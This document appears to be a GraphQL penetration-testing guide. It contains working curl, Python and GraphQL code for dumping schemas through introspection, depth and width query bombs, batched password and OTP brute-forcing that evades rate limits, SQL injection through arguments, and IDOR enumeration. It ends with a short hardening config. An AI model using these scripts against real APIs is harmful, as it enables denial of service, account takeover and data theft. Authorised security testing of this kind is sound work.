# GraphQL Security Testing Guide

> Practical techniques for testing GraphQL APIs including introspection abuse, query complexity attacks, batching exploits, and injection vectors.

---

## 1. Introspection Abuse

GraphQL introspection allows querying the schema itself. When left enabled in production, attackers can map the entire API surface.

```bash
# Full introspection query to dump schema
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}'
```

```bash
# Extract all type names and fields using jq
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}' \
  | jq '.data.__schema.types[] | select(.name | startswith("__") | not) | {name, fields: [.fields[]?.name]}'
```

```python
# Automated introspection with graphql-cop
import requests

INTROSPECTION_QUERY = """
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name } }
        args { name type { name } }
      }
    }
  }
}
"""

def dump_schema(url, headers=None):
    resp = requests.post(url, json={"query": INTROSPECTION_QUERY}, headers=headers or {})
    if "__schema" in resp.text:
        schema = resp.json()["data"]["__schema"]
        for t in schema["types"]:
            if not t["name"].startswith("__") and t["fields"]:
                print(f"\nType: {t['name']}")
                for f in t["fields"]:
                    print(f"  - {f['name']}: {f['type']['name'] or f['type']['kind']}")
    else:
        print("Introspection disabled or blocked")

dump_schema("https://target.com/graphql")
```

---

## 2. Query Complexity Attacks (DoS)

Deeply nested queries can exhaust server resources when no depth or complexity limits are enforced.

```graphql
# Nested query causing exponential resolution (depth attack)
query DepthBomb {
  users {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
              email
            }
          }
        }
      }
    }
  }
}
```

```bash
# Automated depth testing with increasing nesting
for depth in 5 10 20 50 100; do
  NESTED=$(python3 -c "
fields = 'name'
for i in range($depth):
    fields = 'friends { ' + fields + ' }'
print('{ users { ' + fields + ' } }')
")
  echo "Testing depth: $depth"
  time curl -s -o /dev/null -w "%{http_code} %{time_total}s" \
    -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"$NESTED\"}"
  echo ""
done
```

```graphql
# Field duplication attack (width attack)
query WidthBomb {
  a1: users(first: 100) { name email posts { title } }
  a2: users(first: 100) { name email posts { title } }
  a3: users(first: 100) { name email posts { title } }
  a4: users(first: 100) { name email posts { title } }
  # Repeat aliases to multiply server load
}
```

---

## 3. Batching Exploits

GraphQL batching allows sending multiple operations in a single request, enabling brute-force and rate-limit bypass.

```bash
# Batch brute-force login attempt (bypasses per-request rate limiting)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{login(email:\"admin@target.com\",password:\"password1\"){token}}"},
    {"query":"mutation{login(email:\"admin@target.com\",password:\"password2\"){token}}"},
    {"query":"mutation{login(email:\"admin@target.com\",password:\"password3\"){token}}"},
    {"query":"mutation{login(email:\"admin@target.com\",password:\"admin123\"){token}}"},
    {"query":"mutation{login(email:\"admin@target.com\",password:\"letmein\"){token}}"}
  ]'
```

```python
# Batch OTP brute-force via aliased queries
import requests
import json

url = "https://target.com/graphql"
codes = [f"{i:06d}" for i in range(0, 10000)]

# Send 100 codes per batch request
for batch_start in range(0, len(codes), 100):
    batch = codes[batch_start:batch_start + 100]
    query_parts = []
    for i, code in enumerate(batch):
        query_parts.append(
            f'a{i}: verifyOTP(code: "{code}") {{ success token }}'
        )
    query = "mutation {" + " ".join(query_parts) + "}"
    resp = requests.post(url, json={"query": query})
    results = resp.json().get("data", {})
    for key, val in results.items():
        if val and val.get("success"):
            print(f"Valid OTP found: {batch[int(key[1:])]}")
            break
```

---

## 4. Injection and Authorization Bypass

```graphql
# SQL injection via GraphQL arguments
query {
  user(id: "1 OR 1=1--") {
    name
    email
    role
  }
}
```

```bash
# Testing IDOR via GraphQL - enumerate user IDs
for id in $(seq 1 100); do
  result=$(curl -s -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"query\":\"{user(id:\\\"$id\\\"){name email role}}\"}")
  echo "ID $id: $(echo $result | jq -r '.data.user.email // empty')"
done
```

---

## 5. Detection and Defense Validation

```yaml
# Example GraphQL security configuration to test against
# (Apollo Server with depth and complexity limits)
graphql_config:
  introspection: false  # Disable in production
  max_depth: 7
  max_complexity: 1000
  max_batch_size: 5
  persisted_queries_only: true
  rate_limit:
    window: 60s
    max_requests: 100
    per: ip_and_token
```

Verify defenses are working by confirming introspection returns errors, deep queries are rejected with appropriate messages, and batch sizes above the limit are refused.
